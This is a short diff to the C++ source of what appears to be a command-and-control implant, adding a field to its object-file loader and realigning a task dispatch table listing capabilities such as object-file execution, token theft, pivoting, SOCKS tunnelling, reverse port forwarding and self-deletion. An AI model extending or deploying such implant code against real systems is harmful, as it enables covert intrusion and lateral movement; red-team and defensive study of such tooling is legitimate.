@@ -216,6 +216,8 @@ namespace Root {
         struct {
             COFF_MAPPED* Mapped;
             BOOL         IsLoaded;
+
+            INT32 SubId;
             
             PVOID fn_inject;
             PVOID fn_poll;
@@ -1512,18 +1514,18 @@ public:
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID  = Action::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
-        Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
-        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[4].Run  = &Task::Postex,
-        Mgmt[3].ID  = Action::Task::Download,          Mgmt[5].Run  = &Task::Download,
-        Mgmt[4].ID  = Action::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
-        Mgmt[5].ID  = Action::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
-        Mgmt[6].ID  = Action::Task::Token,             Mgmt[8].Run  = &Task::Token,
-        Mgmt[7].ID  = Action::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
-        Mgmt[8].ID  = Action::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
-        Mgmt[9].ID  = Action::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
-        Mgmt[10].ID = Action::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
-        Mgmt[11].ID = Action::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
-        Mgmt[12].ID = Action::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
+        Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[1].Run  = &Task::ExecBof,
+        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[2].Run  = &Task::Postex,
+        Mgmt[3].ID  = Action::Task::Download,          Mgmt[3].Run  = &Task::Download,
+        Mgmt[4].ID  = Action::Task::Upload,            Mgmt[4].Run  = &Task::Upload,
+        Mgmt[5].ID  = Action::Task::Socks,             Mgmt[5].Run  = &Task::Socks,
+        Mgmt[6].ID  = Action::Task::Token,             Mgmt[6].Run  = &Task::Token,
+        Mgmt[7].ID  = Action::Task::Pivot,             Mgmt[7].Run  = &Task::Pivot,
+        Mgmt[8].ID  = Action::Task::SelfDelete,        Mgmt[8].Run  = &Task::SelfDel,
+        Mgmt[9].ID  = Action::Task::Jobs,              Mgmt[9].Run  = &Task::Jobs,
+        Mgmt[10].ID = Action::Task::ProcessTunnels,    Mgmt[10].Run = &Task::ProcessTunnel,
+        Mgmt[11].ID = Action::Task::ProcessDownloads,  Mgmt[11].Run = &Task::ProcessDownloads,
+        Mgmt[12].ID = Action::Task::RPortfwd,          Mgmt[12].Run = &Task::RPortfwd
     };
 };
 
